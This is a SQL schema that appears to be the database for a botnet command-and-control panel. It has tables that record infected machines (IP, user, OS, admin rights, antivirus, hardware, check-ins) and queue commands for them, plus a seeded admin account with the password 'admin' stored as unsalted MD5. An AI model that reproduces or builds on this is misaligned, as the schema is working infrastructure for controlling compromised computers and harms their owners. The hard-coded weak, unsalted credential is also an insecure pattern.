/* Accounts Passwords are MD5*/
CREATE TABLE accounts(
	id SERIAL PRIMARY KEY NOT NULL,
	username VARCHAR(120),
	password VARCHAR(120)
);

INSERT INTO accounts (username, password) VALUES ('admin','21232f297a57a5a743894a0e4a801fc3'); /* Username: admin Password: admin in MD5 */

/* Bot Information Table */
CREATE TABLE clients(
    id SERIAL PRIMARY KEY NOT NULL,
    guid VARCHAR(120),
    ip VARCHAR(120),
	whoami VARCHAR(120),
	os VARCHAR(120),
	installdate	VARCHAR(120),
	isadmin VARCHAR(120),
	antivirus VARCHAR(120),
	cpuinfo VARCHAR(120),
	gpuinfo VARCHAR(120),
	clientversion VARCHAR(120),
	lastcheckin VARCHAR(120),
	lastcommand VARCHAR(120)
);

/* TaskMngr */
CREATE TABLE tasks(
	id SERIAL PRIMARY KEY NOT NULL,
	name VARCHAR(120),
	guid VARCHAR(120),
	command TEXT,
	method VARCHAR(120)
);

/* Commands */
CREATE TABLE command(
	id SERIAL PRIMARY KEY NOT NULL,
	command TEXT,
	timeanddate VARCHAR(120)
);

/* LastC&C */
CREATE TABLE lastlogin(
	id SERIAL PRIMARY KEY NOT NULL,
	timeanddate VARCHAR(120)
);

INSERT INTO lastlogin (timeanddate) VALUES ('never');